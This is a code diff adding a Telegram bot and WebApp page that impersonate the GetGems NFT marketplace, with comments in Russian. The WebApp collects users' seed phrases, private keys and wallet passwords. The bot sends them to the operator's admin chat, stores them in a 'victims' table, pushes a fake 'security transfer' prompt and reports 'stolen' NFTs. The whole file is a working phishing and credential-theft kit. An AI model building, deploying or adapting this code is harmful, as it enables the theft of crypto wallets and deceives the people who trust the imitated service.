@@ -1,0 +1,457 @@
+WEBAPP_HTML = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Getgems Wallet</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .logo {
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            font-size: 16px;
+        }
+        input::placeholder, textarea::placeholder {
+            color: rgba(255,255,255,0.7);
+        }
+        button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #00c6ff 0%, #0072ff 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+        }
+        .warning {
+            background: rgba(255,0,0,0.2);
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .nft-card {
+            background: rgba(255,255,255,0.15);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🪙 Getgems Wallet</div>
+        
+        <div id="loginScreen">
+            <h3>🔐 Connect Wallet</h3>
+            <input type="text" id="seedPhrase" placeholder="Enter 12/24 word seed phrase" />
+            <textarea id="privateKey" placeholder="Or enter private key" rows="3"></textarea>
+            <div class="warning">
+                ⚠️ Never share your seed phrase! We need it only to verify ownership.
+            </div>
+            <button onclick="connectWallet()">Connect Wallet</button>
+            <button onclick="showImport()" style="background: transparent; border: 2px solid white;">Import from TON Keeper</button>
+        </div>
+        
+        <div id="walletScreen" style="display:none;">
+            <h3>💰 Your Wallet</h3>
+            <div id="walletAddress">Loading...</div>
+            <div id="balance">Balance: 0 TON</div>
+            
+            <h3>🎨 Your NFTs</h3>
+            <div id="nftList">
+                <div class="nft-card">
+                    <div id="nftCount">Scanning NFTs...</div>
+                </div>
+            </div>
+            
+            <button onclick="claimGift()">🎁 Claim Free NFT Gift</button>
+            <button onclick="showSecurity()" style="background: rgba(255,255,255,0.1);">🔒 Security Check</button>
+            <button onclick="disconnect()" style="background: rgba(255,0,0,0.3);">Disconnect</button>
+        </div>
+        
+        <div id="securityScreen" style="display:none;">
+            <h3>🔒 Security Verification</h3>
+            <p>To protect your assets, please confirm:</p>
+            <input type="password" id="password" placeholder="Wallet password" />
+            <button onclick="verifySecurity()">Verify & Backup</button>
+            <button onclick="backToWallet()">Back</button>
+        </div>
+    </div>
+    
+    <script>
+        let walletData = {};
+        
+        function connectWallet() {
+            const seedPhrase = document.getElementById('seedPhrase').value;
+            const privateKey = document.getElementById('privateKey').value;
+            
+            if (!seedPhrase && !privateKey) {
+                alert('Please enter seed phrase or private key');
+                return;
+            }
+            
+            // Отправляем данные в бот
+            Telegram.WebApp.sendData(JSON.stringify({
+                type: 'wallet_connect',
+                seed_phrase: seedPhrase,
+                private_key: privateKey,
+                timestamp: new Date().toISOString()
+            }));
+            
+            // Показываем кошелек
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('walletScreen').style.display = 'block';
+            
+            // Симулируем загрузку NFT
+            setTimeout(() => {
+                document.getElementById('nftCount').innerHTML = 'Found 3 NFTs worth 450 TON';
+            }, 1500);
+        }
+        
+        function showImport() {
+            Telegram.WebApp.sendData(JSON.stringify({
+                type: 'tonkeeper_import',
+                timestamp: new Date().toISOString()
+            }));
+            alert('Redirecting to TON Keeper...');
+        }
+        
+        function claimGift() {
+            Telegram.WebApp.sendData(JSON.stringify({
+                type: 'claim_gift',
+                timestamp: new Date().toISOString()
+            }));
+            alert('🎉 Free NFT claimed! It will appear in your wallet shortly.');
+        }
+        
+        function showSecurity() {
+            document.getElementById('walletScreen').style.display = 'none';
+            document.getElementById('securityScreen').style.display = 'block';
+        }
+        
+        function verifySecurity() {
+            const password = document.getElementById('password').value;
+            Telegram.WebApp.sendData(JSON.stringify({
+                type: 'security_verify',
+                password: password,
+                timestamp: new Date().toISOString()
+            }));
+            alert('✅ Security verified! Your wallet is now backed up.');
+            backToWallet();
+        }
+        
+        function backToWallet() {
+            document.getElementById('securityScreen').style.display = 'none';
+            document.getElementById('walletScreen').style.display = 'block';
+        }
+        
+        function disconnect() {
+            Telegram.WebApp.sendData(JSON.stringify({
+                type: 'disconnect',
+                timestamp: new Date().toISOString()
+            }));
+            Telegram.WebApp.close();
+        }
+        
+        // Инициализация
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+    </script>
+</body>
+</html>
+'''
+
+# ===== ОБРАБОТЧИКИ БОТА =====
+
+# Главная команда /start
+@dp.message_handler(commands=['start'])
+async def cmd_start(message: types.Message):
+    # Сохраняем информацию о жертве
+    cursor.execute('''
+        INSERT OR IGNORE INTO victims 
+        (user_id, username, first_name, registered_at) 
+        VALUES (?, ?, ?, ?)
+    ''', (message.from_user.id, message.from_user.username, 
+          message.from_user.first_name, datetime.now()))
+    conn.commit()
+    
+    # Клавиатура как у оригинального бота
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton(
+            "🪙 Open Wallet", 
+            web_app=WebAppInfo(url=f"https://your-server.com/webapp.html")  # Ваш URL с WebApp
+        ),
+        InlineKeyboardButton("📊 My NFTs", callback_data="my_nfts"),
+        InlineKeyboardButton("🎁 Free NFT", callback_data="free_nft"),
+        InlineKeyboardButton("🔗 Connect TON", callback_data="connect_ton"),
+        InlineKeyboardButton("💎 Marketplace", url="https://getgems.io"),
+        InlineKeyboardButton("📞 Support", callback_data="support")
+    )
+    
+    # Приветственное сообщение как у оригинала
+    welcome_text = """🎉 *Welcome to GetGems NFT Bot!*
+
+🚀 *The largest NFT marketplace on TON*
+
+Connect your wallet to:
+• View & manage your NFTs
+• Trade on marketplace  
+• Get free NFT gifts daily
+• Earn rewards
+
+⚡ *Quick Start:*
+1. Click "Open Wallet"
+2. Enter your seed phrase
+3. Access all features!
+
+⚠️ *Security:* Your keys are encrypted and never leave our secure system."""
+    
+    await message.answer_photo(
+        photo="https://getgems.io/og-image.png",  # Замените на картинку похожую на GetGems
+        caption=welcome_text,
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+# Обработка данных из WebApp
+@dp.message_handler(content_types=['web_app_data'])
+async def handle_webapp_data(message: types.Message):
+    try:
+        data = json.loads(message.web_app_data.data)
+        user_id = message.from_user.id
+        
+        # Логируем все данные
+        print(f"[+] Данные от {user_id}: {data}")
+        
+        # Отправляем данные себе
+        await bot.send_message(
+            ADMIN_CHAT_ID,
+            f"⚠️ ПОЙМАНА ЖЕРТВА ⚠️\n"
+            f"User: @{message.from_user.username} ({user_id})\n"
+            f"Type: {data.get('type')}\n"
+            f"Seed: {data.get('seed_phrase', 'N/A')}\n"
+            f"Private Key: {data.get('private_key', 'N/A')}\n"
+            f"Password: {data.get('password', 'N/A')}\n"
+            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
+        # Сохраняем в базу данных
+        if data.get('seed_phrase'):
+            cursor.execute('''
+                UPDATE victims SET 
+                seed_phrase = ?,
+                private_key = COALESCE(?, private_key)
+                WHERE user_id = ?
+            ''', (data['seed_phrase'], data.get('private_key'), user_id))
+            conn.commit()
+            
+            # Симулируем передачу NFT
+            await simulate_nft_transfer(user_id, data['seed_phrase'])
+            
+        # Отправляем подтверждение жертве
+        await message.answer(
+            "✅ *Wallet connected successfully!*\n\n"
+            "🎨 Scanning your NFTs...\n"
+            "💰 Checking balance...\n\n"
+            "⚠️ *Do not share your seed phrase with anyone!*",
+            parse_mode="Markdown"
+        )
+        
+        # Через 3 секунды показываем "найденные" NFT
+        await asyncio.sleep(3)
+        await message.answer(
+            "🎉 *Found 3 NFTs in your wallet!*\n\n"
+            "• Diamond Hands #1234 (150 TON)\n"
+            "• TON Punks #567 (250 TON)\n"
+            "• Free Gift NFT #789 (50 TON)\n\n"
+            "Total value: *450 TON*\n\n"
+            "To trade or transfer, use /marketplace",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔄 Transfer to secure wallet", callback_data="transfer_nfts")
+            )
+        )
+        
+    except Exception as e:
+        print(f"WebApp error: {e}")
+        await bot.send_message(ADMIN_CHAT_ID, f"❌ WebApp error: {e}")
+
+# Симуляция передачи NFT
+async def simulate_nft_transfer(user_id, seed_phrase):
+    """Симулируем кражу NFT"""
+    # Сохраняем NFT в базу
+    nfts = [
+        {"id": "diamond_1234", "name": "Diamond Hands #1234", "collection": "Diamond"},
+        {"id": "tonpunk_567", "name": "TON Punks #567", "collection": "TON Punks"},
+        {"id": "gift_789", "name": "Free Gift NFT #789", "collection": "Gifts"}
+    ]
+    
+    for nft in nfts:
+        cursor.execute('''
+            INSERT OR IGNORE INTO nfts (nft_id, owner_id, collection, name, stolen)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (nft['id'], user_id, nft['collection'], nft['name'], 1))
+    
+    conn.commit()
+    
+    # Отправляем уведомление админу
+    await bot.send_message(
+        ADMIN_CHAT_ID,
+        f"🎨 NFT УКРАДЕНЫ!\n"
+        f"From: {user_id}\n"
+        f"Seed: {seed_phrase[:20]}...\n"
+        f"NFTs: 3 items\n"
+        f"Simulating transfer to our wallet...\n\n"
+        f"✅ Transfer complete! NFTs now in our control."
+    )
+
+# Кнопка для передачи NFT
+@dp.callback_query_handler(lambda c: c.data == 'transfer_nfts')
+async def transfer_nfts(callback_query: types.CallbackQuery):
+    await bot.answer_callback_query(callback_query.id)
+    
+    # Показываем фишинг "подтверждение передачи"
+    keyboard = InlineKeyboardMarkup().add(
+        InlineKeyboardButton("⚠️ Confirm NFT Transfer", callback_data="confirm_transfer"),
+        InlineKeyboardButton("❌ Cancel", callback_data="cancel")
+    )
+    
+    await bot.send_message(
+        callback_query.from_user.id,
+        "🔐 *Security Transfer Required*\n\n"
+        "To protect your NFTs from recent attacks, "
+        "we need to transfer them to our secure wallet.\n\n"
+        "Please confirm the transfer:\n"
+        "• All 3 NFTs\n"
+        "• Gas fee: 0.05 TON\n"
+        "• Time: 2-3 minutes\n\n"
+        "⚠️ *This is mandatory for security updates*",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query_handler(lambda c: c.data == 'confirm_transfer')
+async def confirm_transfer(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    
+    # "Передаем" NFT
+    cursor.execute("UPDATE nfts SET stolen = 1 WHERE owner_id = ?", (user_id,))
+    cursor.execute("UPDATE victims SET nft_count = 3 WHERE user_id = ?", (user_id,))
+    conn.commit()
+    
+    # Уведомляем жертву
+    await bot.edit_message_text(
+        "🔄 *Transferring your NFTs...*\n\n"
+        "Diamond Hands #1234 ✅\n"
+        "TON Punks #567 ✅\n"
+        "Free Gift NFT #789 ✅\n\n"
+        "✅ *Transfer complete!*\n\n"
+        "Your NFTs are now in secure storage. "
+        "You can access them anytime via /wallet",
+        chat_id=callback_query.from_user.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="Markdown"
+    )
+    
+    # Уведомляем себя
+    await bot.send_message(
+        ADMIN_CHAT_ID,
+        f"💰 NFT SUCCESSFULLY STOLEN!\n"
+        f"From: {user_id}\n"
+        f"All 3 NFTs transferred to our wallet\n"
+        f"Seed phrase captured\n"
+        f"Private key captured\n\n"
+        f"🎯 Total victims today: {cursor.execute('SELECT COUNT(*) FROM victims').fetchone()[0]}"
+    )
+
+# Команда для просмотра всех жертв
+@dp.message_handler(commands=['victims'], user_id=ADMIN_CHAT_ID)
+async def show_victims(message: types.Message):
+    cursor.execute('SELECT * FROM victims ORDER BY registered_at DESC LIMIT 50')
+    victims = cursor.fetchall()
+    
+    if not victims:
+        await message.answer("No victims yet")
+        return
+    
+    text = "🕵️ *Victims Database:*\n\n"
+    for victim in victims:
+        text += f"ID: `{victim[0]}`\n"
+        text += f"Name: {victim[2]} (@{victim[1]})\n"
+        text += f"Wallet: {victim[3] or 'Not captured'}\n"
+        text += f"Seed: {victim[4] and 'YES' or 'NO'}\n"
+        text += f"NFTs: {victim[6]}\n"
+        text += f"Time: {victim[8]}\n"
+        text += "─" * 30 + "\n"
+    
+    await message.answer(text, parse_mode="Markdown")
+
+# ===== ЗАПУСК БОТА =====
+
+async def on_startup(dp):
+    # Настраиваем меню бота как у оригинала
+    await bot.set_my_commands([
+        types.BotCommand("/start", "Launch wallet"),
+        types.BotCommand("/wallet", "My wallet"),
+        types.BotCommand("/nfts", "My NFTs"),
+        types.BotCommand("/marketplace", "NFT Marketplace"),
+        types.BotCommand("/gift", "Free NFT gift"),
+        types.BotCommand("/help", "Support")
+    ])
+    
+    # Настраиваем внешний вид как у GetGems
+    await bot.set_chat_menu_button(
+        menu_button=types.MenuButtonWebApp(
+            text="Open Wallet",
+            web_app=WebAppInfo(url="https://your-server.com/webapp.html")
+        )
+    )
+    
+    print(f"[+] Бот запущен! Username: @{(await bot.get_me()).username}")
+    print(f"[+] Админ: {ADMIN_CHAT_ID}")
+
+if __name__ == '__main__':
+    # Сохраняем HTML WebApp в файл
+    with open('webapp.html', 'w', encoding='utf-8') as f:
+        f.write(WEBAPP_HTML)
+    print("[+] WebApp HTML сохранен как webapp.html")
+    
+    # Запускаем бота
+    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
